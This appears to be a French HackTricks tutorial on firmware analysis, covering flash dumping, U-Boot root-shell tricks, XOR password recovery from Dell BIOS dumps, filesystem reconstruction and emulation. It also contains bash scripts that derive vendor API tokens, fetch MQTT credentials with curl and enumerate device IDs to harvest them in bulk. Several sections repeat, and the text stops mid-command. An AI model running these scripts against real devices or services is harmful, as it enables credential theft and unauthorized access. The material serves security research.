# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

Pour l’acquisition via des interfaces matérielles exposées, consultez [l’extraction du firmware assistée par console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) et [l’extraction de la mémoire flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Pour une capture UART répétable au démarrage, avant l’accès à la console, consultez [l’alimentation contrôlée par SCPI et l’acquisition à l’oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, ce qui permet à l’appareil d’accéder aux instructions essentielles dès sa mise sous tension et de lancer le système d’exploitation. L’examen et la modification éventuelle du firmware constituent une étape cruciale pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape essentielle pour comprendre la composition d’un appareil et les technologies qu’il utilise. Ce processus consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation utilisé
- Les caractéristiques du bootloader
- La disposition du matériel et les fiches techniques
- Les métriques de la base de code et l’emplacement du code source
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les diagrammes d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse des composants logiciels open source disponibles, au moyen de processus d’examen manuel et automatisé. Des outils tels que [Coverity Scan](https://scan.coverity.com) et [LGTM de Semmle](https://lgtm.com/#explore) proposent une analyse statique gratuite qui peut aider à détecter d’éventuels problèmes.

## **Obtention du firmware**

Il existe plusieurs façons d’obtenir un firmware, chacune présentant un niveau de complexité différent :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** à partir des instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **stockage cloud**, à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** au moyen de techniques man-in-the-middle
- L’**extraire** de l’appareil via des connexions comme **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ou **PICit**
- **Écouter** les requêtes de mise à jour dans les communications de l’appareil
- Identifier et utiliser les **endpoints de mise à jour codés en dur**
- L’**extraire** du bootloader ou du réseau
- **Retirer et lire** la puce de stockage, en dernier recours, à l’aide du matériel approprié

### Journaux UART uniquement : forcer un root shell via l’environnement U-Boot dans la mémoire flash

Si les données UART RX sont ignorées (journaux uniquement), vous pouvez tout de même forcer un shell init en **modifiant hors ligne le blob d’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Extraire la mémoire flash SPI avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition d’environnement U-Boot, modifiez `bootargs` pour inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’environnement U-Boot** pour le blob.
3. Reflashez uniquement la partition d’environnement et redémarrez ; un shell devrait apparaître sur l’UART.

Cette méthode est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition d’environnement est accessible en écriture via un accès externe à la Flash.

### Divulgation de code protégé via une tâche de copie du Firewall

Certains MCU permettent au code d’application non protégé d’appeler une passerelle vers une région protégée, plutôt que de lire directement la Flash protégée. Après avoir obtenu l’exécution de code dans l’application, examinez chaque tâche de la passerelle comme une primitive de transfert mémoire distincte. Dans le cas du Cypherock X1, le point d’entrée du Firewall STM32L4 acceptait une tâche, un pointeur `data` externe, une longueur et une `address` protégée. Une tâche d’écriture ne vérifiait pas que le pointeur source `data` ne pointait pas vers du code du Firewall. L’appelant ne pouvait pas lire directement ce code, mais la passerelle pouvait le copier dans une mémoire non volatile protégée, que la tâche de lecture autorisée pouvait ensuite exposer.<sup>[[15]](#references)</sup>

Pour reproduire ce type de divulgation, identifiez une page de stockage protégé accessible en écriture et associée à une tâche de lecture, définissez la source de l’écriture sur des adresses successives du code protégé, puis relisez les octets copiés. Vérifiez le support de stockage avant de répéter les écritures : dans ce cas, il s’agissait de Flash, et la page devait donc être effacée avant réutilisation. Les chercheurs ont utilisé une routine qui effaçait puis restaurait le contenu valide du Secure Data Storage, avant de copier le code dans l’espace libre restant plutôt que d’écraser les données du wallet. Cette méthode nécessite l’exécution de code sur le MCU et l’accès à un point d’entrée de passerelle ; elle ne permet pas de contourner directement la lecture depuis un hôte non authentifié.<sup>[[15]](#references)</sup>

Le code récupéré peut révéler des [lacunes de confiance dans la mise à jour du firmware et l’intégrité du démarrage](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analyse du firmware

Maintenant que vous **disposez du firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser pour cela :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` : si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Vous pouvez aussi utiliser [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour examiner le fichier.

### Ressources graphiques brutes dans la mémoire flash externe

Un dump SPI externe ne contient pas nécessairement le firmware exécutable du MCU. Pour une cible Cortex-M, comparez le début de chaque région candidate contenant du code avec la carte mémoire du périphérique : une table des vecteurs normale commence par un pointeur de pile SRAM plausible et une adresse de gestionnaire de réinitialisation située dans la mémoire exécutable. L’absence d’une table des vecteurs à l’offset zéro ne prouve pas à elle seule que la puce entière ne contient aucun code ; examinez d’autres offsets ainsi que l’organisation du démarrage. Si `binwalk` ne trouve aucun conteneur, examinez les octets bruts et faites le lien entre les adresses de lecture flash extraites d’une [capture SPI décodée](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) et les actions qui chargent de nouveaux écrans.<sup>[[14]](#references)</sup>

Pour une région contenant des ressources d’affichage, essayez différents formats de pixels et différentes dimensions au lieu de supposer qu’il s’agit de PNG/JPEG. Le périphérique cité utilisait des images **80×160 RGB565 little-endian** : à deux octets par pixel, une image fait **25 600 octets** (25 Kio), et non 24 kilobits. Une adresse de lecture flash décodée a permis d’identifier l’offset de la ressource d’écran ; le chercheur a converti une image préparée avec `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, remplacé la ressource de même taille dans le dump original, écrit le contenu avec `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, puis confirmé l’affichage de la nouvelle image. Cela démontre que les *ressources d’affichage externes* sont modifiables ; il ne s’agit pas d’extraire ou de reflasher le firmware interne du MCU. Conservez le dump original et vérifiez les dimensions, l’ordre des octets, l’offset et la longueur du remplacement avant toute écriture.<sup>[[14]](#references)</sup>

### Analyse différentielle de la mémoire flash et récupération de secrets stockés via XOR

Lorsqu’un paramètre du firmware n’a pas de format de stockage documenté, effectuez d’abord plusieurs lectures identiques de la mémoire flash, modifiez **un seul** paramètre, puis dumpez à nouveau la puce entière et comparez les offsets. Répétez l’expérience avec des valeurs contrôlées afin de distinguer le paramètre des compteurs et des métadonnées d’écriture ; des changements à de nouveaux offsets plutôt qu’en place indiquent un stockage en ajout seul ou structuré en journal. Conservez les entrées supprimées ou marquées comme obsolètes, car leurs octets de données peuvent encore être récupérables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Après avoir localisé la région, extrayez les modules du firmware à l’aide d’outils tels que `binwalk`, puis rétro-ingénieriez le code d’écriture et de validation dans Ghidra. Confirmez dans le code les limites des champs, le padding, l’indexation des clés et la dérivation de la clé au lieu de déduire le schéma uniquement à partir des motifs du texte chiffré.<sup>[[12]](#references)</sup>

#### Récupérer les clés à partir du padding zéro chiffré

Comme décrit dans le [chiffrement basé sur XOR](../../crypto/symmetric/#xor-based-encryption), le texte en clair connu révèle les octets de flot de clé aux mêmes offsets. Un champ de taille fixe est particulièrement exposé lorsque son padding zéro couvre tous les indices d’une clé XOR répétée : le padding chiffré révèle directement ces octets de clé, car `0x00 XOR key_byte = key_byte`. Si tous les indices de la clé sont couverts, reconstituez la clé à partir de la fin du texte chiffré et déchiffrez les octets renseignés.<sup>[[12]](#references)</sup>

Le format vulnérable de mot de passe BIOS DVAR de Dell en est un exemple concret : l’octet `0` d’un champ de 32 octets est en clair, tandis que les octets `1..31` utilisent une clé répétée de 20 octets.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Pour une longueur de mot de passe `L`, les positions `L..31` étaient à zéro avant le XOR. Lorsque `L <= 12`, ces positions couvrent tous les index de clé, ce qui permet de récupérer la clé complète et le mot de passe sans brute force :<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraire des clés à partir d’enregistrements historiques

N’analysez pas chaque enregistrement indépendamment. La clé DVAR est dérivée approximativement ainsi : `modified_md5(device_seed || variable_GUID || password[0])` : le device seed et le GUID sont fixes, et la seule entrée dépendant du mot de passe est son premier octet en clair. Cela donne au maximum 256 clés par appareil et fait que les enregistrements commençant par le même octet partagent une clé. Regroupez les enregistrements actifs et supprimés selon cet octet ; un court enregistrement historique peut révéler la clé complète par le biais du padding et permettre de déchiffrer un enregistrement actuel plus long dont le padding est insuffisant. La rotation du mot de passe peut donc accroître l’exposition lorsque l’ancien texte chiffré est tombstoné au lieu d’être effacé.<sup>[[12]](#references)</sup>

L’outil [`dellpwn`](https://github.com/R3n5k1/dellpwn) localise DVAR, valide les enregistrements candidats, récupère les mots de passe et peut afficher les octets bruts stockés/de clé. Compilez-le à partir d’un checkout et analysez une image flash vérifiée comme suit :<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Pour les analyseurs personnalisés, rejetez les faux positifs en vérifiant la structure des enregistrements, les contraintes sur les caractères imprimables, le remplissage par des zéros, l’entropie de la clé et la cohérence lorsque la clé revient au début. Si des dumps répétés montrent peu de bits inversés à chaque écriture, énumérez les masques observés et classez les corrections selon ces contraintes, mais signalez les caractères ambigus au lieu de présenter un résultat heuristique comme une récupération exacte.<sup>[[12]](#references)</sup>

Les vérificateurs de mots de passe devraient stocker un hachage à sens unique, salé et itéré, plutôt qu’un texte chiffré réversible. Les systèmes de stockage structurés en journal devraient également supprimer de manière sécurisée les données secrètes remplacées.<sup>[[12]](#references)</sup>

### Récupération du système de fichiers

Avec les outils mentionnés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier nommé d’après le type de système de fichiers**, qui est habituellement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **ne reconnaît pas les octets magiques du système de fichiers dans ses signatures**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire le système de fichiers compressé** du binaire, puis **extrayez manuellement** le système de fichiers selon son type, en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec une mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstruire les systèmes de fichiers racine embarqués répartis sur plusieurs segments

Si un dump brut d’eMMC/SSD contient un en-tête de système de fichiers valide, mais que les décalages de ses métadonnées dépassent la partition nominale, ne le considérez pas immédiatement comme corrompu. Le code de démarrage embarqué peut assembler le périphérique racine réel à partir de plusieurs plages physiques à l’aide de Device Mapper. L’extraction d’une seule partition GPT ne fournit donc que le premier segment.<sup>[[9]](#references)</sup>

#### Examiner l’image complète du support

Vérifiez d’abord que l’acquisition est terminée, que la taille est stable et qu’aucun processus d’écriture n’utilise encore l’image. Si le nom de fichier encode une adresse de début et de fin, comparez cette plage au nombre réel d’octets. Récupérez la GPT en mode lecture seule et n’attachez que la plage nécessaire ; n’exécutez **pas** `vgchange -ay` sur un volume physique non fiable depuis la station de travail, car des conflits de groupes de volumes et des écritures involontaires sont possibles.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Préférez une VM jetable lorsque la logique `init` d’origine ou une pile LVM doit accéder à l’image entière. Les journaux de démarrage historiques d’une partition de démarrage standard sont particulièrement utiles : le bootloader peut avoir enregistré les décalages du conteneur propriétaire, les longueurs des composants, la sélection du slot, les règles d’alignement et la vérification de signature. Utilisez ces valeurs pour extraire une ligne de commande, un kernel et un initramfs intégrés, puis validez chaque sortie indépendamment avec `file`, les octets magiques et `binwalk` ; lire jusqu’à la fin du conteneur peut accidentellement ajouter un initrd, un objet ACPI ou une signature au kernel.<sup>[[9]](#references)</sup>

#### Récupérer la cartographie des blocs au démarrage

Extrayez l’initramfs du kernel et faites de la rétro-ingénierie sur son `/init` ainsi que sur toutes les bibliothèques de stockage. Dans [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), suivez les références de chaînes pour `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` et les chemins de partitions ; tracez ensuite le code qui sélectionne le slot A/B actif et construit la table. Parmi les points de départ utiles dans radare2 : `r2 -A init`, `afl`, `pdf @ main` et `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

La cible linear mappe des plages consécutives d’un périphérique virtuel sur des plages d’un ou plusieurs périphériques sous-jacents. Une table récupérée à deux segments a souvent cette forme (toutes les positions et longueurs sont exprimées en secteurs de 512 octets) :<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduisez exactement l’arithmétique du code machine, notamment la largeur des entiers, les décalages et les conversions d’unités. Par exemple, l’expression suivante arrondit par défaut une taille en octets à une limite de 4 Kio, puis la convertit seulement ensuite en secteurs de 512 octets ; la remplacer par `p4_bytes // 512` décale la fin sélectionnée de `p4_bytes % 4096` lorsque la partition n’est pas alignée sur une page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruisez une image d’analyse à plat en copiant les plages dans l’ordre du tableau, par blocs de taille limitée, plutôt que de charger le dump média complet en mémoire. Cela évite également de créer des périphériques mapper côté hôte. Gardez les offsets dérivés de GPT, les nombres de secteurs inversés et la longueur de sortie obtenue comme assertions distinctes.<sup>[[9]](#references)</sup>

#### Distinguer une corruption d’une erreur de reconstruction constante

Pour SquashFS, vérifiez la magic `hsqs` et décodez le champ `bytes_used` little-endian de 64 bits à l’offset 40 du superbloc avant d’exécuter `unsquashfs`. Si l’extraction échoue dans plusieurs structures sans rapport entre elles, recherchez dans une large fenêtre autour des positions attendues et exigez des candidats structurels solides : un bloc de métadonnées décompressible, plusieurs entrées de répertoire valides consécutives, des champs d’inode plausibles, un inode racine cohérent avec le nombre d’inodes ou une structure de métadonnées d’intégrité valide. Une seule correspondance de magic ne suffit pas.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Lorsque le même delta signé rend valides des structures indépendantes — par exemple les métadonnées d’un répertoire et un enregistrement verity — la cause probable est une erreur systématique de début de segment plutôt que des octets manquants. Revenez aux calculs inversés et recherchez des restes supprimés, des problèmes de signedness, des débordements ou des arrondis au secteur ou à la page avant de tenter de récupérer des fichiers orphelins ou de modifier les métadonnées du système de fichiers.<sup>[[9]](#references)</sup>

Enfin, distinguez les limites de protection : les volumes LUKS scellés par TPM protègent la confidentialité des données, tandis qu’un mapping dm-verity signé protège l’intégrité du système de fichiers racine. Un TPM logiciel ne permet pas de récupérer une clé scellée au TPM physique d’origine, et démarrer un SquashFS modifié à l’aide d’un init réservé à la recherche qui omet la vérification verity ne falsifie pas sa signature et ne compromet pas dm-verity.<sup>[[9]](#references)</sup>

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus consiste à utiliser divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour inspecter initialement le fichier binaire (désigné par `<bin>`). Ces commandes aident à identifier les types de fichiers, à extraire des chaînes de caractères, à analyser les données binaires et à comprendre les détails des partitions et des systèmes de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer l’état du chiffrement de l’image, on vérifie son **entropie** avec `binwalk -E <bin>`. Une faible entropie suggère une absence de chiffrement, tandis qu’une entropie élevée indique un chiffrement ou une compression possible.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et des ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour inspecter les fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (par exemple, squashfs, ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Elle consiste à utiliser `binwalk` pour localiser le décalage du système de fichiers, puis la commande `dd` pour l’extraire :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (par exemple squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On s’intéresse aux daemons réseau non sécurisés, aux identifiants codés en dur, aux endpoints d’API, aux fonctionnalités des serveurs de mise à jour, au code non compilé, aux scripts de démarrage et aux binaires compilés en vue d’une analyse hors ligne.

**Emplacements** et **éléments clés** à inspecter :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Les certificats SSL et les clés dans **etc/ssl**
- Les fichiers de configuration et les scripts susceptibles de présenter des vulnérabilités
- Les binaires embarqués à analyser plus en détail
- Les serveurs web et les binaires courants des appareils IoT

Plusieurs outils aident à découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Vérifications de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à repérer les binaires non protégés qui pourraient être exploités.

## Récupération de la configuration cloud et des identifiants MQTT à partir de tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un endpoint cloud de la forme suivante :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Cette conception permet à toute personne qui connaît un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en clair et des préfixes de topics.

Procédure pratique :

1) Extraire le deviceId des journaux de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les journaux :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token depuis le firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (par exemple, MD5(deviceId||STATIC_KEY)).
- Dériver le token dans Bash et mettre l’empreinte en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composer l’URL et récupérer le JSON avec curl ; l’analyser avec jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Exploiter MQTT en texte clair et des ACL de topics faibles (si elles existent)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer les ID d’appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les ID candidats, dériver des tokens et récupérer des configs par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Obtenez toujours une autorisation explicite avant toute tentative d’énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.


L’émulation du firmware permet d’effectuer une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme individuel. Cette approche peut se heurter à des dépendances matérielles ou liées à l’architecture, mais le transfert du système de fichiers racine ou de binaires spécifiques vers un appareil doté d’une architecture et d’une endianness correspondantes, tel qu’un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter les tests.

### Émulation de binaires individuels

Pour examiner des programmes individuels, il est essentiel d’identifier l’endianness du programme ainsi que l’architecture du processeur.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire destiné à l’architecture MIPS, vous pouvez utiliser la commande suivante :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), `qemu-mips` est utilisé, tandis que `qemu-mipsel` convient aux binaires little-endian.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé pour l’émulation.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, automatisent le processus et facilitent l’analyse dynamique.

### Reconstruction de systèmes de fichiers root scindés et vérifiés pour l’émulation

Si un superbloc SquashFS est lisible, mais que les offsets des tables d’inodes, de répertoires ou de fragments sont impossibles, ne corrigez pas immédiatement `unsquashfs`. Reverse-engineerez le binaire de démarrage précoce et reproduisez le graphe des périphériques bloc qu’il crée : les systèmes embarqués peuvent exposer une partition root nominale, mais construire le véritable système de fichiers avec un mappage `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications du seul superbloc peuvent réussir alors que tous les blocs de métadonnées suivants sont décalés.<sup>[[11]](#references)</sup>

Conservez exactement les opérations arithmétiques du firmware. Identifiez notamment si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages et les troncatures dans leur ordre d’origine ; et tenez compte des régions de fin dépendantes de la banque dans les configurations A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d’abord à la limite de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; le remplacer par `partition_bytes // 512` peut décaler l’étendue ajoutée de quelques kilo-octets et corrompre toutes les tables SquashFS en aval.<sup>[[11]](#references)</sup>

Voici un workflow de validation utile :<sup>[[11]](#references)</sup>

1. Récupérez chaque périphérique source, secteur de départ et longueur des segments `dm-linear` à partir du binaire du vérificateur ou d’init.
2. Concaténez ou mappez les étendues sans modifier leur sémantique d’alignement.
3. Si l’extraction échoue encore, recherchez uniquement dans une petite fenêtre autour de la limite prédite et exigez plusieurs structures de métadonnées valides consécutives, plutôt que de vous contenter d’un superbloc plausible.
4. Exécutez un `unsquashfs` non modifié sur l’image reconstruite ; le parcours réussi de tous les répertoires et fragments constitue une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l’analyste

Lorsque l’analyste contrôle le noyau QEMU, l’initramfs et les disques virtuels, il est possible de démarrer un root modifié en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s’agit d’une **substitution de la chaîne de démarrage en laboratoire**, et non d’un contournement de dm-verity, de sa signature RSA, de Secure Boot ou d’une clé scellée par TPM.<sup>[[11]](#references)</sup>

L’init de remplacement doit reproduire les étapes opérationnelles du parcours de démarrage d’origine : monter `devtmpfs`, appeler `setsid()`, connecter `/dev/console` aux descripteurs de fichiers 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter le root modifié en lecture seule, détacher les pseudo-systèmes de fichiers de l’ancien root, déplacer le nouveau montage sur `/`, appeler `chroot`, puis exécuter (`execve()`) le `/sbin/init` d’origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher accidentellement des points de montage appartenant au nouveau root.<sup>[[11]](#references)</sup>

Conservez l’état mutable du périphérique séparément du root immuable modifié. Un overlay qcow2 peut préserver l’état LVM du disque d’origine, tandis qu’un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
